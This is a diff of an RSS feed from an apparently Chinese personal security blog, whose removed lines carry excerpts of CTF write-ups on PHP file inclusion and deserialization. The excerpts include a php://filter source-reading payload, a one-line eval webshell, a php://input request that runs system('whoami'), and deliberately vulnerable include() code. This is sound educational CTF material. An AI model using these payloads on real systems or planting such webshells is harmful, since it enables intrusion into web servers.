@@ -1,228 +1,45 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PHP on 东阳的个人站点</title><link>https://Samantha09.github.io/san-blog/tags/php/</link><description>Recent content in PHP on 东阳的个人站点</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Fri, 05 Jun 2026 23:30:00 +0800</lastBuildDate><atom:link href="https://Samantha09.github.io/san-blog/tags/php/index.xml" rel="self" type="application/rss+xml"/><item><title>php://filter 伪协议：在文件包含中读取源代码</title><link>https://Samantha09.github.io/san-blog/posts/php/filter-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%AD%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81/</link><pubDate>Fri, 05 Jun 2026 23:30:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/php/filter-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%AD%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81/</guid><description>&lt;h2 id="一phpfilter-是什么"&gt;一、php://filter 是什么&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;php://filter&lt;/code&gt; 是 PHP 提供的一种&lt;strong&gt;元封装协议（meta wrapper）&lt;/strong&gt;，用于在访问数据流时&lt;strong&gt;对数据进行过滤和转换&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;与 &lt;code&gt;php://input&lt;/code&gt; 不同，&lt;code&gt;php://filter&lt;/code&gt; 的核心价值不在于执行代码，而在于&lt;strong&gt;以安全的方式读取文件内容&lt;/strong&gt;——尤其是当目标文件是 PHP 源码时。&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id="二为什么需要-phpfilter-读取源码"&gt;二、为什么需要 php://filter 读取源码&lt;/h2&gt;
-&lt;p&gt;假设存在如下漏洞代码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;include&lt;/span&gt;($file); &lt;span style="color:#75715e"&gt;// 用户可控！
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果我们直接传入 &lt;code&gt;?file=index.php&lt;/code&gt;，会发生什么？&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;GET /?file=index.php HTTP/1.1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;include('index.php')&lt;/code&gt; 会&lt;strong&gt;执行&lt;/strong&gt; &lt;code&gt;index.php&lt;/code&gt; 中的 PHP 代码，而不是显示它的源码。页面上看到的仍然是渲染后的 HTML 输出。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;那如何看到源码呢？&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;答案就是 &lt;code&gt;php://filter&lt;/code&gt;。利用它的编码过滤器，可以在 PHP 代码被执行前，先将文件内容进行 Base64 编码：&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;?file=php://filter/read=convert.base64-encode/resource=index.php
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样返回的就是 Base64 编码后的源码字符串，而不是执行结果。&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id="三基本语法结构"&gt;三、基本语法结构&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;php://filter/&amp;lt;action&amp;gt;=&amp;lt;filter_list&amp;gt;/resource=&amp;lt;target_file&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
-	&lt;thead&gt;
-			&lt;tr&gt;
-					&lt;th&gt;组成部分&lt;/th&gt;
-					&lt;th&gt;说明&lt;/th&gt;
-			&lt;/tr&gt;
-	&lt;/thead&gt;
-	&lt;tbody&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;read=&lt;/code&gt; / &lt;code&gt;write=&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;对读取/写入的数据应用过滤器&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;filter_list&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;过滤器名称，支持链式调用（用 `&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;resource=&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;指定目标文件路径&lt;/td&gt;
-			&lt;/tr&gt;
-	&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h3 id="31-常用过滤器"&gt;3.1 常用过滤器&lt;/h3&gt;
-&lt;table&gt;
-	&lt;thead&gt;
-			&lt;tr&gt;
-					&lt;th&gt;过滤器&lt;/th&gt;
-					&lt;th&gt;功能&lt;/th&gt;
-			&lt;/tr&gt;
-	&lt;/thead&gt;
-	&lt;tbody&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;convert.base64-encode&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;Base64 编码&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;convert.base64-decode&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;Base64 解码&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;string.rot13&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;ROT13 编码&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;string.toupper&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;转大写&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;string.tolower&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;转小写&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;convert.iconv.*&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;字符集转换&lt;/td&gt;
-			&lt;/tr&gt;
-	&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;hr&gt;
-&lt;h2 id="四实战案例ctfhub-文件包含读源码"&gt;四、实战案例：CTFHub 文件包含读源码&lt;/h2&gt;
-&lt;h3 id="41-题目环境"&gt;4.1 题目环境&lt;/h3&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;URL: http://&amp;lt;TARGET_IP&amp;gt;:&amp;lt;PORT&amp;gt;/
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面提示：&lt;/p&gt;</description></item><item><title>CTFHub 文件包含实战：利用一句话木马 getshell</title><link>https://Samantha09.github.io/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</link><pubDate>Fri, 05 Jun 2026 23:10:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</guid><description>&lt;h2 id="一题目信息"&gt;一、题目信息&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：CTFHub&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：Skill / Web / RCE / 文件包含&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;考点&lt;/strong&gt;：PHP &lt;code&gt;include&lt;/code&gt; 函数、一句话木马、WebShell 连接&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;题目链接：&lt;a href="https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html"&gt;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&lt;/a&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id="二源码分析"&gt;二、源码分析&lt;/h2&gt;
-&lt;p&gt;进入题目后，直接给出了 PHP 源码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;); &lt;span style="color:#75715e"&gt;// 关闭报错显示
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;])) { &lt;span style="color:#75715e"&gt;// 接收 file 参数
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;], &lt;span style="color:#e6db74"&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;) { &lt;span style="color:#75715e"&gt;// 如果包含 &amp;#34;flag&amp;#34; 字符串
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;hack&amp;#34;&lt;/span&gt;; &lt;span style="color:#75715e"&gt;// 输出 hack，阻止访问
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;include&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;]); &lt;span style="color:#75715e"&gt;// 否则包含指定文件
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="逻辑梳理"&gt;逻辑梳理&lt;/h3&gt;
-&lt;table&gt;
-	&lt;thead&gt;
-			&lt;tr&gt;
-					&lt;th&gt;条件&lt;/th&gt;
-					&lt;th&gt;结果&lt;/th&gt;
-			&lt;/tr&gt;
-	&lt;/thead&gt;
-	&lt;tbody&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;file&lt;/code&gt; 参数包含 &lt;code&gt;&amp;quot;flag&amp;quot;&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;输出 &lt;code&gt;hack&lt;/code&gt;，包含失败&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;file&lt;/code&gt; 参数不含 &lt;code&gt;&amp;quot;flag&amp;quot;&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;执行 &lt;code&gt;include($file)&lt;/code&gt;&lt;/td&gt;
-			&lt;/tr&gt;
-	&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;&lt;strong&gt;核心考点&lt;/strong&gt;：&lt;code&gt;include()&lt;/code&gt; 函数的特性——&lt;strong&gt;不检查后缀，直接执行文件中的 PHP 代码&lt;/strong&gt;。&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id="三发现突破口"&gt;三、发现突破口&lt;/h2&gt;
-&lt;p&gt;题目下方有一个提示链接，访问后得到 &lt;code&gt;shell.txt&lt;/code&gt;：&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;http://&amp;lt;TARGET_IP&amp;gt;:&amp;lt;PORT&amp;gt;/shell.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;内容是一句话木马：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;($_REQUEST[&lt;span style="color:#e6db74"&gt;&amp;#39;ctfhub&amp;#39;&lt;/span&gt;]);&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;连接密码&lt;/strong&gt;：&lt;code&gt;ctfhub&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;原理&lt;/strong&gt;：&lt;code&gt;eval()&lt;/code&gt; 函数将 &lt;code&gt;$_REQUEST['ctfhub']&lt;/code&gt; 接收到的内容作为 PHP 代码执行&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h2 id="四解题思路"&gt;四、解题思路&lt;/h2&gt;
-&lt;h3 id="41-include-函数的关键特性"&gt;4.1 include 函数的关键特性&lt;/h3&gt;
-&lt;p&gt;假设 &lt;code&gt;index.php&lt;/code&gt; 中执行了：&lt;/p&gt;</description></item><item><title>php://input 文件包含漏洞利用：从原理到实战</title><link>https://Samantha09.github.io/san-blog/posts/php/input-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98/</link><pubDate>Fri, 05 Jun 2026 22:50:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/php/input-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98/</guid><description>&lt;h2 id="一phpinput-是什么"&gt;一、php://input 是什么&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;php://input&lt;/code&gt; 是 PHP 提供的&lt;strong&gt;只读数据流包装器（wrapper）&lt;/strong&gt;，它允许开发者直接访问 &lt;strong&gt;HTTP 请求的原始请求体（raw POST data）&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;在文件包含漏洞的利用场景中，&lt;code&gt;php://input&lt;/code&gt; 是一把利器：当我们能够控制 &lt;code&gt;include()&lt;/code&gt; / &lt;code&gt;require()&lt;/code&gt; 等函数的文件参数时，传入 &lt;code&gt;php://input&lt;/code&gt;，PHP 就会把&lt;strong&gt;请求体中的内容当作 PHP 代码&lt;/strong&gt;来解析执行。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;💡 关键前提：&lt;code&gt;allow_url_include = On&lt;/code&gt;（PHP 5.x 部分默认开启，PHP 7+ 默认关闭）&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;hr&gt;
-&lt;h2 id="二利用原理"&gt;二、利用原理&lt;/h2&gt;
-&lt;p&gt;假设存在如下存在漏洞的代码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;include&lt;/span&gt;($file); &lt;span style="color:#75715e"&gt;// 用户可控！
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当我们发送如下请求时：&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;GET /?file=php://input HTTP/1.1
-Host: target.com
-Content-Length: 29
-
-&amp;lt;?php system(&amp;#34;whoami&amp;#34;); ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行流程如下：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;$_GET['file']&lt;/code&gt; 获取到字符串 &lt;code&gt;&amp;quot;php://input&amp;quot;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;include(&amp;quot;php://input&amp;quot;)&lt;/code&gt; 打开 &lt;code&gt;php://input&lt;/code&gt; 数据流&lt;/li&gt;
-&lt;li&gt;PHP 从 HTTP 请求体中读取内容：&lt;code&gt;&amp;lt;?php system(&amp;quot;whoami&amp;quot;); ?&amp;gt;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;读取到的内容被当作 PHP 代码&lt;strong&gt;包含并执行&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;system(&amp;quot;whoami&amp;quot;)&lt;/code&gt; 被执行，返回当前系统用户&lt;/li&gt;
-&lt;/ol&gt;
-&lt;hr&gt;
-&lt;h2 id="三实战案例ctfhub-文件包含"&gt;三、实战案例：CTFHub 文件包含&lt;/h2&gt;
-&lt;p&gt;下面结合一道 CTFHub 真题，完整走一遍利用流程。&lt;/p&gt;</description></item><item><title>[0CTF 2016]piapiapia</title><link>https://Samantha09.github.io/san-blog/posts/0ctf-2016piapiapia/</link><pubDate>Fri, 30 May 2025 15:00:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/0ctf-2016piapiapia/</guid><description>&lt;h2 id="题目信息"&gt;题目信息&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：Web / PHP 反序列化&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;核心漏洞&lt;/strong&gt;：反序列化字符串逃逸 + 任意文件读取&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;源码泄露&lt;/strong&gt;：&lt;code&gt;www.zip&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h2 id="源码结构"&gt;源码结构&lt;/h2&gt;
-&lt;p&gt;下载源码后得到以下关键文件：&lt;/p&gt;
-&lt;table&gt;
-	&lt;thead&gt;
-			&lt;tr&gt;
-					&lt;th&gt;文件&lt;/th&gt;
-					&lt;th&gt;作用&lt;/th&gt;
-			&lt;/tr&gt;
-	&lt;/thead&gt;
-	&lt;tbody&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;index.php&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;登录页面&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;register.php&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;注册页面&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;update.php&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;更新个人信息（文件上传 + 数据入库）&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;profile.php&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;展示个人信息（触发文件读取）&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;class.php&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;核心类（user + mysql）&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;&lt;code&gt;config.php&lt;/code&gt;&lt;/td&gt;
-					&lt;td&gt;配置文件（含 flag）&lt;/td&gt;
-			&lt;/tr&gt;
-	&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;hr&gt;
-&lt;h2 id="漏洞分析"&gt;漏洞分析&lt;/h2&gt;
-&lt;h3 id="1-任意文件读取核心利用点"&gt;1. 任意文件读取（核心利用点）&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;profile.php&lt;/code&gt; 第 16 行：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$profile &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($profile);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$photo &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;base64_encode&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($profile[&lt;span style="color:#e6db74"&gt;&amp;#39;photo&amp;#39;&lt;/span&gt;]));
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;$profile&lt;/code&gt; 是从数据库读取的序列化字符串，经过 &lt;code&gt;unserialize()&lt;/code&gt; 后得到数组。&lt;code&gt;$profile['photo']&lt;/code&gt; 作为文件路径传入 &lt;code&gt;file_get_contents()&lt;/code&gt;，结果被 base64 编码输出到页面。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;如果能控制 &lt;code&gt;$profile['photo']&lt;/code&gt; 的值，就能读取服务器上的任意文件。&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id="2-反序列化字符串逃逸"&gt;2. 反序列化字符串逃逸&lt;/h3&gt;
-&lt;h4 id="21-filter-函数"&gt;2.1 filter() 函数&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;class.php&lt;/code&gt; 中的 &lt;code&gt;filter()&lt;/code&gt;：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($string) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\\\\&amp;#39;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $escape) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $string &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($escape, &lt;span style="color:#e6db74"&gt;&amp;#39;_&amp;#39;&lt;/span&gt;, $string);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;select&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;update&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;where&amp;#39;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $safe) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/i&amp;#39;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($safe, &lt;span style="color:#e6db74"&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;, $string);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;关键点：&lt;/p&gt;</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>PHP on 东阳的个人站点</title>
+		<link>http://127.0.0.1:1313/san-blog/tags/php/</link>
+		<description>Recent content in PHP on 东阳的个人站点</description>
+		<generator>Hugo</generator>
+		<language>zh-cn</language>
+		
+		
+		
+		
+			<lastBuildDate>Fri, 05 Jun 2026 23:30:00 +0800</lastBuildDate>
+		
+			<atom:link href="http://127.0.0.1:1313/san-blog/tags/php/index.xml" rel="self" type="application/rss+xml" />
+			<item>
+				<title>php://filter 伪协议：在文件包含中读取源代码</title>
